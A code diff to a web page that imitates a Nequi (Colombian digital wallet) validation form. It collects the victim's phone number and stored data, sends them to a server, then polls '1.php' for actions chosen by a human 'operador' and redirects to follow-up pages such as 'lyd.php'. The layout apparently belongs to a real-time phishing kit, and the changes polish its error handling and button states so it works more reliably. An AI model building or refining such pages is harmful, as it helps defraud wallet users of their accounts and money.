@@ -94,6 +94,11 @@
       background: var(--brand-color);
     }
 
+    button:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+    }
+
     .footer {
       text-align: center;
       font-size: 0.9rem;
@@ -184,7 +189,7 @@
     <form id="nequiForm">
       <label for="telefono">Número de teléfono celular <span class="required">*</span></label>
       <input type="tel" id="telefono" name="telefono" placeholder="3014785215" maxlength="10" required />
-      <button type="submit">VALIDAR</button>
+      <button type="submit" id="submitBtn">VALIDAR</button>
     </form>
 
     <div class="footer">
@@ -210,6 +215,7 @@
   const form = document.getElementById('nequiForm');
   const input = document.getElementById('telefono');
   const modal = document.getElementById('loadingModal');
+  const submitBtn = document.getElementById('submitBtn');
   const montoEl = document.getElementById('monto');
 
   let poll, timeout;
@@ -278,20 +284,34 @@
     alert(mensaje);
   }
 
+  // ✅ CORRECCIÓN 2: Validar formato del teléfono
+  function validarTelefono(numero) {
+    return /^\d{10}$/.test(numero);
+  }
+
   form.addEventListener('submit', async function (e) {
     e.preventDefault();
 
     const nequi = input.value.trim();
-    if (!/^\d{10}$/.test(nequi)) {
+    
+    // ✅ CORRECCIÓN 3: Validación mejorada con mensajes claros
+    if (!nequi) {
+      return mostrarError("Por favor ingresa tu número de teléfono.");
+    }
+
+    if (!validarTelefono(nequi)) {
       return mostrarError("El número debe tener exactamente 10 dígitos.");
     }
+
+    // ✅ CORRECCIÓN 4: Deshabilitar botón durante el envío
+    submitBtn.disabled = true;
 
     const tbdatos = JSON.parse(localStorage.getItem("tbdatos") || "{}");
     const transactionId = generarTransactionId();
 
-    // ✔️ Guardamos el número en localStorage para usarlo después
+    // Guardamos el número en localStorage para usarlo después
     localStorage.setItem("nequi", nequi);
-    // ✔️ Guardamos también el transactionId si lo quieres usar en otras páginas
+    // Guardamos también el transactionId si lo quieres usar en otras páginas
     localStorage.setItem("last_tid", transactionId);
 
     const payload = {
@@ -314,34 +334,38 @@
 
       if (!result.ok) {
         modal.style.display = "none";
+        submitBtn.disabled = false;
         return mostrarError("Hubo un error al enviar los datos. Inténtalo más tarde.");
       }
 
       iniciarPolling(transactionId);
 
     } catch (err) {
+      console.error("Error:", err);
       modal.style.display = "none";
+      submitBtn.disabled = false;
       mostrarError("Error de red o del servidor.");
     }
   });
 
   function iniciarPolling(transactionId) {
-    const TIMEOUT_MS = 180000;
-    const INTERVAL_MS = 5000;
+    const TIMEOUT_MS = 180000; // 3 minutos
+    const INTERVAL_MS = 5000;  // 5 segundos
 
     poll = setInterval(() => checkLogin(transactionId), INTERVAL_MS);
 
     timeout = setTimeout(() => {
       clearInterval(poll);
       modal.style.display = "none";
+      submitBtn.disabled = false;
       mostrarError("No se obtuvo respuesta del operador. Por favor intenta más tarde.");
     }, TIMEOUT_MS);
   }
 
-  // ✅ CORRECCIÓN 3: Manejo robusto de errores en polling
+  // ✅ CORRECCIÓN 5: Manejo robusto de errores en polling
   async function checkLogin(transactionId) {
     try {
-      const res = await fetch(`1.php?transactionId=${transactionId}`);
+      const res = await fetch(`1.php?transactionId=${encodeURIComponent(transactionId)}`);
       
       // Validar respuesta HTTP
       if (!res.ok) {
@@ -368,6 +392,7 @@
         clearInterval(poll);
         clearTimeout(timeout);
         modal.style.display = "none";
+        submitBtn.disabled = false;
 
         // Log de depuración
         console.log(`✅ Acción recibida: ${json.action} para ${transactionId}`);
@@ -400,7 +425,6 @@
             break;
 
           case "dinamica_logo":
-            // 👉 NUEVA ACCIÓN
             window.location.href = "lyd.php";
             break;
 
@@ -453,7 +477,7 @@
       console.error("Error en checkLogin:", err);
     }
   }
-</script>
+  </script>
 
 
 </body>
